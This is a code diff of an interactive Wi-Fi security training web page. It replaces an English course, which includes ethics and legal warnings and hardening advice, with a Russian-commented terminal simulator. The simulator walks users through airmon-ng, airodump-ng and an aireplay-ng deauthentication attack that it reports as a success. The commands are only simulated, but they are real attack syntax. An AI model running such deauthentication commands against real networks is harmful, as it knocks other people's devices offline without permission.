-                            <div class="option" onclick="selectOption(this, false)">To connect to the Wi-Fi network</div>
-                        </div>
-                    </div>
-                </div>
-                
-                <button onclick="completeModule(3)">Complete Module</button>
-            </div>
-        </div>
+    // Добавить стили для мини-компьютера и анимаций
+    const style = document.createElement('style');
+    style.innerHTML = `
+    .mini-pc { display: flex; justify-content: center; margin: 1.2em 0; width: 100%; max-width: 100vw; overflow-x: hidden; box-sizing: border-box; min-width: 0; }
+    .pc-body { background: rgba(24,27,31,0.98); border-radius: 18px; box-shadow: 0 4px 32px #000a; padding: 1.2em 1em 1em 1em; width: 98vw; max-width: 400px; min-width: 0; position: relative; border: 2px solid #fff2; margin: 0 auto; overflow: hidden; box-sizing: border-box; }
+    .pc-feet { position: absolute; left: 18px; right: 18px; bottom: -16px; display: flex; justify-content: space-between; }
+    .pc-foot { width: 32px; height: 12px; background: #444d57; border-radius: 6px 6px 12px 12px; box-shadow: 0 2px 8px #0008; }
+    .pc-screen { background: #111216; border-radius: 12px; box-shadow: 0 2px 12px #0008, 0 0 0 2px #fff2 inset; width: 100%; min-height: 100px; height: 32vw; max-height: 180px; margin-bottom: 1em; display: flex; align-items: flex-end; overflow: hidden; position: relative; min-width: 0; max-width: 100%; box-sizing: border-box; border: 2px solid #fff2; }
+    .pc-screen::after { content: ''; position: absolute; left: 12px; top: 12px; width: 65%; height: 22px; background: linear-gradient(90deg, #fff2 10%, #fff1 60%, transparent 100%); border-radius: 10px; opacity: 0.16; pointer-events: none; }
+    .pc-terminal { color: #fff; font-family: 'JetBrains Mono', 'Consolas', monospace; font-size: 1.13em; padding: 0.9em; width: 100%; min-height: 2em; filter: contrast(1.1) brightness(1.1); text-shadow: 0 0 2px #fff2, 0 0 1px #ff2a2a22; animation: term-flicker 2.5s infinite linear alternate; word-break: break-all; }
+    @keyframes term-flicker { 0%{opacity:1;} 97%{opacity:1;} 98%{opacity:0.97;} 99%{opacity:1;} 100%{opacity:0.99;} }
+    .pc-leds { display: flex; gap: 0.7em; margin-bottom: 1em; justify-content: center; }
+    .led { display: inline-block; width: 18px; height: 18px; border-radius: 50%; background: #444; box-shadow: 0 0 8px #0008; border: 2px solid #fff2; opacity: 0.4; filter: brightness(0.7); transition: opacity 0.4s, filter 0.4s, box-shadow 0.4s; }
+    .led.on { opacity: 1; filter: brightness(1.2); }
+    .led-green { background: #fff; box-shadow: 0 0 12px #fff; }
+    .led-yellow { background: #ffeb3b; box-shadow: 0 0 12px #ffeb3b; }
+    .led-red { background: #ff2a2a; box-shadow: 0 0 12px #ff2a2a; }
+    .pc-keyboard { margin-top: 0.7em; }
+    .pc-input { width: 100%; background: #181b1f; color: #fff; border: 1.5px solid #ff2a2a; border-radius: 8px; padding: 0.9em 0.7em; font-size: 1.13em; font-family: inherit; margin-bottom: 0.7em; box-sizing: border-box; }
+    .sim-progress { width: 100%; background: #23272b; border-radius: 6px; margin: 1em 0 0.5em 0; height: 14px; overflow: hidden; }
+    .sim-progress-bar { height: 100%; background: #ff2a2a; width: 0%; transition: width 0.5s; }
+    @media (max-width: 600px) {
+      .pc-body { max-width: 98vw; width: 98vw; padding: 0.2em 0.01em 0.2em 0.01em; }
+      .mini-pc { max-width: 100vw; padding: 0; }
+      .pc-terminal, .pc-input { font-size: 16px; }
+      .pc-screen { height: 32vw; min-height: 100px; max-height: 140px; }
+      .card { padding: 0.7rem 0.3rem; }
+      .step-title { padding: 0.2rem 0.1rem; }
+    }
+    @media (max-width: 400px) { .pc-body { max-width: 100vw; } }
+    `;
+    document.head.appendChild(style);
 
-        <div class="module">
-            <div class="module-header" onclick="toggleModule('module4')">
-                <h2>Module 4: Capturing Network Traffic</h2>
-                <span class="toggle-icon">+</span>
-            </div>
-            <div class="module-content" id="module4">
-                <p>Once your interface is in monitor mode, you can capture and analyze network traffic to identify vulnerabilities.</p>
-                
-                <h3>Using airodump-ng for Traffic Capture</h3>
-                <p>Airodump-ng is a tool that captures packets and displays information about nearby networks:</p>
-                
-                <div class="terminal">
-                    <div class="command">sudo airodump-ng wlan0mon</div>
-                    <div class="output">BSSID              PWR  Beacons  #Data  CH   MB   ENC   CIPHER AUTH  ESSID
-00:11:22:33:44:55  -70  542      124   6    54e  WPA2  CCMP   PSK   TestNetwork
-AA:BB:CC:DD:EE:FF  -85  231      42    1    54e  WPA   TKIP   PSK   OtherNetwork</div>
-                </div>
-                
-                <div class="note">
-                    <h3>Explanation</h3>
-                    <p>This command shows all wireless networks in range, including:</p>
-                    <ul>
-                        <li>BSSID - The MAC address of the access point</li>
-                        <li>PWR - Signal strength</li>
-                        <li>CH - The channel the network is operating on</li>
-                        <li>ENC - The encryption type (WEP, WPA, WPA2)</li>
-                        <li>ESSID - The network name</li>
-                    </ul>
-                </div>
-                
-                <h3>Focusing on a Specific Network</h3>
-                <p>To analyze a specific network, you can filter airodump-ng:</p>
-                
-                <div class="terminal">
-                    <div class="command">sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon</div>
-                    <div class="output">BSSID              PWR  Beacons  #Data  CH   MB   ENC   CIPHER AUTH  ESSID
-00:11:22:33:44:55  -70  542      124   6    54e  WPA2  CCMP   PSK   TestNetwork
-                                                                                                
-STATION            PWR   Rate   Lost   Frames  BSSID              PROBES
-11:22:33:44:55:66  -75   0 - 1    0      42    00:11:22:33:44:55</div>
-                </div>
-                
-                <div class="note">
-                    <h3>Explanation</h3>
-                    <p>This command:</p>
-                    <ul>
-                        <li>Filters to show only channel 6</li>
-                        <li>Focuses on the specific BSSID (access point)</li>
-                        <li>Saves the capture to files with the prefix "capture"</li>
-                        <li>Also shows connected clients (STATION)</li>
-                    </ul>
-                </div>
-                
-                <h3>Interactive Practice</h3>
-                <p>Try entering a command to capture traffic from a specific network:</p>
-                
-                <div class="interactive-terminal">
-                    <div class="prompt">
-                        <input type="text" id="captureCommand" placeholder="Enter the command to capture traffic from BSSID AA:BB:CC:DD:EE:FF on channel 1">
-                    </div>
-                    <button onclick="checkCommand('captureCommand', 'sudo airodump-ng -c 1 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon', 'Correct! You\'re now capturing traffic from that specific network.', 'Try again. Check the parameters for channel (-c) and BSSID (--bssid)')">Submit</button>
-                    <div id="captureCommandResult"></div>
-                </div>
-                
-                <div class="quiz-container">
-                    <h3>Quick Check</h3>
-                    <div class="quiz-question">
-                        <p>What parameter would you use to save captured packets to a file?</p>
-                        <div class="options">
-                            <div class="option" onclick="selectOption(this, false)">--save</div>
-                            <div class="option" onclick="selectOption(this, true)">-w</div>
-                            <div class="option" onclick="selectOption(this, false)">--output</div>
-                        </div>
-                    </div>
-                </div>
-                
-                <button onclick="completeModule(4)">Complete Module</button>
-            </div>
-        </div>
-
-        <div class="module">
-            <div class="module-header" onclick="toggleModule('module5')">
-                <h2>Module 5: Network Analysis Simulation</h2>
-                <span class="toggle-icon">+</span>
-            </div>
-            <div class="module-content" id="module5">
-                <p>In this module, we'll simulate analyzing network traffic and understanding deauthentication frames in a controlled environment.</p>
-                
-                <div class="warning">
-                    <h3>Important Safety Notice</h3>
-                    <p>This simulation is for educational purposes only. In a real environment, you should only perform these actions on networks you own or have explicit permission to test.</p>
-                </div>
-                
-                <h3>Understanding Deauthentication Frames</h3>
-                <p>Deauthentication frames are management frames in Wi-Fi that normally help clients disconnect properly. However, they can be used to analyze network behavior:</p>
-                
-                <div class="card">
-                    <h3>Legitimate Uses for Security Professionals:</h3>
-                    <ul>
-                        <li>Testing network resilience against disconnections</li>
-                        <li>Analyzing how devices reconnect to networks</li>
-                        <li>Troubleshooting connection issues</li>
-                        <li>Testing network failover mechanisms</li>
-                    </ul>
-                </div>
-                
-                <h3>Simulation Environment</h3>
-                <p>Let's simulate analyzing a network using aireplay-ng in our controlled environment:</p>
-                
-                <div class="terminal">
-                    <div class="command">sudo aireplay-ng -0 1 -a 00:11:22:33:44:55 -c 11:22:33:44:55:66 wlan0mon</div>
-                    <div class="output">15:22:48  Waiting for beacon frame (BSSID: 00:11:22:33:44:55) on channel 6
-15:22:49  Sending deauthentication frame to client (11:22:33:44:55:66)
-15:22:49  Sent 1 deauthentication frame</div>
-                </div>
-                
-                <div class="note">
-                    <h3>Explanation of Parameters</h3>
-                    <ul>
-                        <li><strong>-0</strong>: Specifies a deauthentication packet type</li>
-                        <li><strong>1</strong>: Number of packets to send (minimal for testing)</li>
-                        <li><strong>-a</strong>: Target access point's MAC address</li>
-                        <li><strong>-c</strong>: Target client's MAC address</li>
-                        <li><strong>wlan0mon</strong>: Interface to use</li>
-                    </ul>
-                </div>
-                
-                <h3>Interactive Simulation</h3>
-                <p>Try the network analysis simulation below:</p>
-                
-                <div id="simulation-area" class="card">
-                    <h3>Network Analysis Simulator</h3>
-                    <div id="network-diagram" style="text-align: center; margin: 20px 0;">
-                        <div style="display: inline-block; padding: 10px; background-color: #2a2a2a; border-radius: 5px; margin: 10px;">
-                            <div>📡</div>
-                            <div>Router</div>
-                            <div style="font-size: 0.8em;">00:11:22:33:44:55</div>
-                        </div>
-                        <div style="display: inline-block; margin: 0 20px;">⟷</div>
-                        <div style="display: inline-block; padding: 10px; background-color: #2a2a2a; border-radius: 5px; margin: 10px;">
-                            <div>📱</div>
-                            <div>Client</div>
-                            <div style="font-size: 0.8em;">11:22:33:44:55:66</div>
-                        </div>
-                    </div>
-                    
-                    <div class="interactive-terminal">
-                        <div class="prompt">
-                            <input type="text" id="simulationCommand" placeholder="Enter command to send a single deauthentication packet for analysis">
-                        </div>
-                        <button onclick="runSimulation()">Run Simulation</button>
-                        <div id="simulation-result" class="output"></div>
-                    </div>
-                    
-                    <div id="simulation-explanation" style="display: none; margin-top: 20px;" class="note">
-                        <h3>Analysis Results</h3>
-                        <p>The simulation shows how a security professional can analyze the behavior of a network when a deauthentication frame is sent.</p>
-                        <p>In a real security audit, this would help identify:</p>
-                        <ul>
-                            <li>How quickly devices reconnect</li>
-                            <li>Whether the network has protections against management frame attacks</li>
-                            <li>If critical services remain available during brief disconnections</li>
-                        </ul>
-                    </div>
-                </div>
-                
-                <div class="quiz-container">
-                    <h3>Quick Check</h3>
-                    <div class="quiz-question">
-                        <p>What is a legitimate reason for a security professional to analyze deauthentication behavior?</p>
-                        <div class="options">
-                            <div class="option" onclick="selectOption(this, true)">Testing network resilience and reconnection mechanisms</div>
-                            <div class="option" onclick="selectOption(this, false)">Preventing others from using the network</div>
-                            <div class="option" onclick="selectOption(this, false)">Stealing user credentials</div>
-                        </div>
-                    </div>
-                </div>
-                
-                <button onclick="completeModule(5)">Complete Module</button>
-            </div>
-        </div>
-
-        <div class="module">
-            <div class="module-header" onclick="toggleModule('module6')">
-                <h2>Module 6: Ethical Considerations and Best Practices</h2>
-                <span class="toggle-icon">+</span>
-            </div>
-            <div class="module-content" id="module6">
-                <p>As security professionals, ethics must guide our work. This module covers the ethical framework for network security testing.</p>
-                
-                <div class="card">
-                    <h3>Ethical Guidelines for Network Security Testing</h3>
-                    <ul>
-                        <li><strong>Permission:</strong> Always obtain explicit written permission before testing any network</li>
-                        <li><strong>Scope:</strong> Clearly define and respect the boundaries of your testing</li>
-                        <li><strong>Documentation:</strong> Maintain detailed logs of all testing activities</li>
-                        <li><strong>Minimal Impact:</strong> Conduct tests in ways that minimize disruption to legitimate users</li>
-                        <li><strong>Confidentiality:</strong> Protect any sensitive information discovered during testing</li>
-                        <li><strong>Responsible Disclosure:</strong> Report vulnerabilities to appropriate parties</li>
-                    </ul>
-                </div>
-                
-                <div class="warning">
-                    <h3>Legal Considerations</h3>
-                    <p>Network security testing without permission can violate various laws, including:</p>
-                    <ul>
-                        <li>Computer Fraud and Abuse Act (US)</li>
-                        <li>Computer Misuse Act (UK)</li>
-                        <li>Similar cybercrime laws in most countries</li>
-                    </ul>
-                    <p>Penalties can include fines and imprisonment.</p>
-                </div>
-                
-                <h3>Securing Your Own Network</h3>
-                <p>Based on what we've learned, here are ways to better secure your networks:</p>
-                
-                <div class="card">
-                    <h3>Wi-Fi Security Best Practices</h3>
-                    <ul>
-                        <li>Use WPA3 when available, or WPA2 with a strong password</li>
-                        <li>Enable Protected Management Frames (PMF) if supported</li>
-                        <li>Change default router credentials</li>
-                        <li>Keep router firmware updated</li>
-                        <li>Consider MAC address filtering (though not foolproof)</li>
-                        <li>Use a guest network for visitors</li>
-                        <li>Consider implementing 802.1X authentication for enterprise networks</li>
-                    </ul>
-                </div>
-                
-                <div class="quiz-container">
-                    <h3>Final Quiz</h3>
-                    <div class="quiz-question">
-                        <p>What is the first step you should take before conducting any network security test?</p>
-                        <div class="options">
-                            <div class="option" onclick="selectOption(this, true)">Obtain explicit written permission from the network owner</div>
-                            <div class="option" onclick="selectOption(this, false)">Install security testing tools</div>
-                            <div class="option" onclick="selectOption(this, false)">Check if the network has vulnerabilities</div>
-                        </div>
-                    </div>
-                    
-                    <div class="quiz-question">
-                        <p>Which of these is the strongest Wi-Fi security protocol?</p>
-                        <div class="options">
-                            <div class="option" onclick="selectOption(this, false)">WEP</div>
-                            <div class="option" onclick="selectOption(this, false)">WPA</div>
-                            <div class="option" onclick="selectOption(this, true)">WPA3</div>
-                        </div>
-                    </div>
-                </div>
-                
-                <button onclick="completeModule(6)">Complete Module</button>
-            </div>
-        </div>
-
-        <div class="card" id="completion-certificate" style="display: none;">
-            <h2>Course Completion</h2>
-            <p>Congratulations! You've completed the Network Security Education course. You now have a better understanding of Wi-Fi security principles and ethical testing practices.</p>
-            
-            <div style="text-align: center; margin: 30px 0; padding: 20px; border: 2px solid var(--accent-steel); border-radius: 5px;">
-                <h2 style="color: var(--accent-steel);">Certificate of Completion</h2>
-                <p>This certifies that you have completed the</p>
-                <h3>Network Security Education Course</h3>
-                <p>With a focus on ethical security testing and network protection</p>
-                <p style="margin-top: 20px;" id="completion-date"></p>
-            </div>
-            
-            <div class="note">
-                <h3>Remember</h3>
-                <p>The knowledge gained from this course should be applied ethically and legally to:</p>
-                <ul>
-                    <li>Improve your own network's security</li>
-                    <li>Conduct authorized security assessments</li>
-                    <li>Contribute positively to cybersecurity</li>
-                </ul>
-            </div>
-        </div>
-    </div>
-
-    <footer>
-        <div class="container">
-            <p>Network Security Education | Educational Content for Legitimate Security Testing</p>
-            <p>Remember to always practice security testing ethically and legally.</p>
-        </div>
-    </footer>
-
-    <script>
-        // Track module completion
-        let completedModules = [false, false, false, false, false, false];
-        
-        // Toggle module content
-        function toggleModule(moduleId) {
-            const moduleContent = document.getElementById(moduleId);
-            if (moduleContent.classList.contains('active')) {
-                moduleContent.classList.remove('active');
-                moduleContent.style.display = 'none';
-                moduleContent.previousElementSibling.querySelector('.toggle-icon').textContent = '+';
-            } else {
-                moduleContent.classList.add('active');
-                moduleContent.style.display = 'block';
-                moduleContent.previousElementSibling.querySelector('.toggle-icon').textContent = '-';
-            }
+    // Симулятор мини-компьютера
+    function setupMiniPC() {
+      const pcInput = document.getElementById('pc-input');
+      const pcTerminal = document.getElementById('pc-terminal');
+      const pcCmd = document.getElementById('pc-cmd');
+      const pcCursor = document.getElementById('pc-cursor');
+      const ledPower = document.getElementById('led-power');
+      const ledNet = document.getElementById('led-net');
+      const ledAttack = document.getElementById('led-attack');
+      const simOutput = document.getElementById('sim-output');
+      const simProgress = document.getElementById('sim-progress');
+      const simProgressBar = document.getElementById('sim-progress-bar');
+      // Проверка наличия всех нужных элементов
+      if (!pcInput || !pcTerminal || !pcCmd || !pcCursor || !ledPower || !ledNet || !ledAttack || !simOutput || !simProgress || !simProgressBar) {
+        setTimeout(setupMiniPC, 100);
+        return;
+      }
+      // Добавить ножки и кнопку перезагрузки
+      const pcBody = document.querySelector('.pc-body');
+      if (!document.querySelector('.pc-feet')) {
+        const feet = document.createElement('div');
+        feet.className = 'pc-feet';
+        feet.innerHTML = '<div class="pc-foot"></div><div class="pc-foot"></div>';
+        pcBody.appendChild(feet);
+      }
+      if (!document.querySelector('.pc-reload')) {
+        const reloadBtn = document.createElement('button');
+        reloadBtn.className = 'pc-reload';
+        reloadBtn.textContent = 'Перезагрузить мини-компьютер';
+        reloadBtn.onclick = resetSim;
+        pcBody.appendChild(reloadBtn);
+      }
+      // Анимация загрузки
+      function bootAnim() {
+        pcTerminal.innerHTML = '';
+        let lines = [
+          'Booting mini-pc...','[OK] Power','[OK] BIOS','[OK] Loading OS','[OK] Network','user@pentest:~$'
+        ];
+        let i=0;
+        setLED(ledPower, 1); setLED(ledNet, 0); setLED(ledAttack, 0);
+        function nextLine() {
+          if (i<lines.length) {
+            const span = document.createElement('span');
+            span.textContent = lines[i]+'\n';
+            span.style.color = i<2?'#81c784':(i<4?'#b0c4de':'#7a8ca5');
+            pcTerminal.appendChild(span);
+            pcTerminal.scrollTop = pcTerminal.scrollHeight;
+            i++;
+            setTimeout(nextLine, 350);
+          } else {
+            pcTerminal.innerHTML += '<span class="pc-prompt">user@pentest:~$</span> <span id="pc-cmd"></span><span class="pc-cursor" id="pc-cursor">█</span>';
+            setLED(ledNet, 0.7);
+            setLED(ledAttack, 0);
+            pcInput.disabled = false;
+            pcInput.focus();
+          }
         }
-        
-        // Switch tabs
-        function switchTab(tabId, contentId) {
-            // Remove active class from all tabs and content
-            document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
-            document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
-            
-            // Add active class to selected tab and content
-            document.querySelector(`.tab[onclick*='${tabId}']`).classList.add('active');
-            document.getElementById(contentId).classList.add('active');
+        pcInput.disabled = true;
+        nextLine();
+      }
+      function setLED(led, on) {
+        if (on) led.classList.add('on'); else led.classList.remove('on');
+      }
+      function printTerminal(text, color) {
+        const span = document.createElement('span');
+        span.textContent = text + '\n';
+        if (color) span.style.color = color;
+        pcTerminal.appendChild(span);
+        pcTerminal.scrollTop = pcTerminal.scrollHeight;
+      }
+      function resetSim() {
+        pcTerminal.innerHTML = '';
+        simOutput.textContent = '';
+        simProgress.style.display = 'none';
+        simProgressBar.style.width = '0%';
+        setLED(ledPower, 1); setLED(ledNet, 0); setLED(ledAttack, 0);
+        stage = 0; history = [];
+        bootAnim();
+      }
+      let stage = 0;
+      let history = [];
+      let busy = false;
+      resetSim();
+      pcInput.value = '';
+      pcInput.focus();
+      pcInput.onkeydown = function(e) {
+        if (busy) return;
+        if (e.key === 'Enter') {
+          const cmd = pcInput.value.trim();
+          if (!cmd) return;
+          history.push(cmd);
+          pcTerminal.innerHTML += '\n<span class="pc-prompt">user@pentest:~$</span> ' + cmd;
+          pcInput.value = '';
+          pcCmd.textContent = '';
+          // Сценарии этапов
+          if (stage === 0 && /^sudo\s+airmon-ng\s+start\s+wlan0$/i.test(cmd)) {
+            setLED(ledNet, 1);
+            printTerminal('Переводим wlan0 в режим мониторинга... [OK]', '#81c784');
+            stage = 1;
+          } else if (stage === 1 && /^sudo\s+airodump-ng\s+wlan0mon$/i.test(cmd)) {
+            printTerminal('Сканирование сетей...\nBSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID\n11:22:33:44:55:66  -40      100        0    0   6  54e  WPA2 CCMP   PSK  testwifi', '#b0c4de');
+            stage = 2;
+          } else if (stage === 2 && /^sudo\s+aireplay-ng\s+--deauth\s+10\s+-a\s+11:22:33:44:55:66\s+wlan0mon$/i.test(cmd)) {
+            setLED(ledAttack, 1);
+            simProgress.style.display = 'block';
+            simProgressBar.style.width = '0%';
+            busy = true;
+            let prog = 0;
+            printTerminal('Отправка deauth-пакетов...', '#e57373');
+            const interval = setInterval(() => {
+              prog += 20;
+              simProgressBar.style.width = prog + '%';
+              if (prog >= 100) {
+                clearInterval(interval);
+                printTerminal('Клиенты отключены! [Успех]', '#81c784');
+                simOutput.innerHTML = '<span style="color:var(--success)">Атака завершена успешно!</span>';
+                setLED(ledAttack, 0);
+                busy = false;
+                nextBtn.disabled = false;
+              }
+            }, 500);
+            stage = 3;
+          } else {
+            printTerminal('bash: команда не найдена или не на этом этапе', '#e57373');
+          }
+        } else {
+          setTimeout(() => {
+            pcCmd.textContent = pcInput.value;
+          }, 0);
         }
-        
-        // Handle option selection in quizzes
-        function selectOption(element, isCorrect) {
-            // Remove any previous selections in the same question
-            const options = element.parentElement.querySelectorAll('.option');
-            options.forEach(option => {
-                option.classList.remove('selected', 'correct', 'incorrect');
-            });
-            
-            // Mark the selected option
-            element.classList.add('selected');
-            
-            if (isCorrect) {
-                element.classList.add('correct');
-                showFeedback(element, 'Correct! ✓', 'success');
-            } else {
-                element.classList.add('incorrect');
-                showFeedback(element, 'Incorrect. Try again. ✗', 'danger');
-            }
-        }
-        
-        // Show feedback message
-        function showFeedback(element, message, type) {
-            // Remove any existing feedback
-            const existingFeedback = element.parentElement.querySelector('.feedback');
-            if (existingFeedback) {
-                existingFeedback.remove();
-            }
-            
-            // Create and add new feedback
-            const feedback = document.createElement('div');
-            feedback.className = 'feedback';
-            feedback.style.color = type === 'success' ? 'var(--success)' : 'var(--danger)';
-            feedback.style.marginTop = '5px';
-            feedback.textContent = message;
-            
-            element.parentElement.appendChild(feedback);
-        }
-        
-        // Check command in interactive terminal
-        function checkCommand(inputId, expectedCommand, successMessage, failMessage) {
-            const inputElement = document.getElementById(inputId);
-            const resultElement = document.getElementById(inputId + 'Result');
-            
-            const command = inputElement.value.trim();
-            
-            if (command.toLowerCase() === expectedCommand.toLowerCase()) {
-                resultElement.innerHTML = `<span style="color: var(--success);">${successMessage}</span>`;
-            } else {
-                resultElement.innerHTML = `<span style="color: var(--danger);">${failMessage}</span>`;
-            }
-        }
-        
-        // Run the network analysis simulation
-        function runSimulation() {
-            const command = document.getElementById('simulationCommand').value.trim();
-            const resultElement = document.getElementById('simulation-result');
-            const explanationElement = document.getElementById('simulation-explanation');
-            
-            // Check if the command is roughly correct (we'll be lenient)
-            if (command.includes('aireplay-ng') && command.includes('-0') && 
-                command.includes('00:11:22:33:44:55') && command.includes('wlan0mon')) {
-                
-                resultElement.innerHTML = `
-                    15:22:48  Waiting for beacon frame (BSSID: 00:11:22:33:44:55) on channel 6<br>
-                    15:22:49  Sending deauthentication frame to client (11:22:33:44:55:66)<br>
-                    15:22:49  Sent 1 deauthentication frame<br>
-                    15:22:51  Client disconnected and reconnected successfully<br>
-                    15:22:52  Analysis complete - reconnection time: 1.2 seconds
-                `;
-                
-                // Show the network diagram with animation
-                const networkDiagram = document.getElementById('network-diagram');
-                networkDiagram.innerHTML = `
-                    <div style="display: inline-block; padding: 10px; background-color: #2a2a2a; border-radius: 5px; margin: 10px;">
-                        <div>📡</div>
-                        <div>Router</div>
-                        <div style="font-size: 0.8em;">00:11:22:33:44:55</div>
-                    </div>
-                    <div style="display: inline-block; margin: 0 20px;">⟷</div>
-                    <div style="display: inline-block; padding: 10px; background-color: #2a2a2a; border-radius: 5px; margin: 10px; animation: blink 1s 3;">
-                        <div>📱</div>
-                        <div>Client</div>
-                        <div style="font-size: 0.8em;">11:22:33:44:55:66</div>
-                    </div>
-                `;
-                
-                // Add a blinking animation style
-                const style = document.createElement('style');
-                style.innerHTML = `
-                    @keyframes blink {
-                        0% { opacity: 1; }
-                        50% { opacity: 0.3; }
-                        100% { opacity: 1; }
-                    }
-                `;
-                document.head.appendChild(style);
-                
-                // Show the explanation
-                explanationElement.style.display = 'block';
-                
-            } else {
-                resultElement.innerHTML = `<span style="color: var(--danger);">Command not recognized. Try using aireplay-ng with the -0 parameter, specify the BSSID (00:11:22:33:44:55) and use wlan0mon as the interface.</span>`;
-                explanationElement.style.display = 'none';
-            }
-        }
-        
-        // Mark module as completed
-        function completeModule(moduleNumber) {
-            completedModules[moduleNumber - 1] = true;
-            updateProgress();
-            
-            // If all modules are completed, show the certificate
-            if (completedModules.every(module => module === true)) {
-                document.getElementById('completion-certificate').style.display = 'block';
-                
-                // Set the completion date
-                const today = new Date();
-                const dateString = today.toLocaleDateString('en-US', { 
-                    year: 'numeric', 
-                    month: 'long', 
-                    day: 'numeric' 
-                });
-                document.getElementById('completion-date').textContent = dateString;
-                
-                // Scroll to the certificate
-                document.getElementById('completion-certificate').scrollIntoView({ behavior: 'smooth' });
-            }
-        }
-        
-        // Update progress bar
-        function updateProgress() {
-            const completedCount = completedModules.filter(module => module === true).length;
-            const totalModules = completedModules.length;
-            const progressPercentage = (completedCount / totalModules) * 100;
-            
-            document.getElementById('progressBar').style.width = `${progressPercentage}%`;
-        }
-        
-        // Initialize with first module open
-        document.addEventListener('DOMContentLoaded', function() {
-            toggleModule('module1');
-            updateProgress();
-        });
-    </script>
+      };
+      // Не перекрывать экран клавиатурой на мобильных
+      pcInput.scrollIntoView({block:'center'});
+    }
+
+    // Инициализация
+    renderStep();
+  </script>
 </body>
 </html>
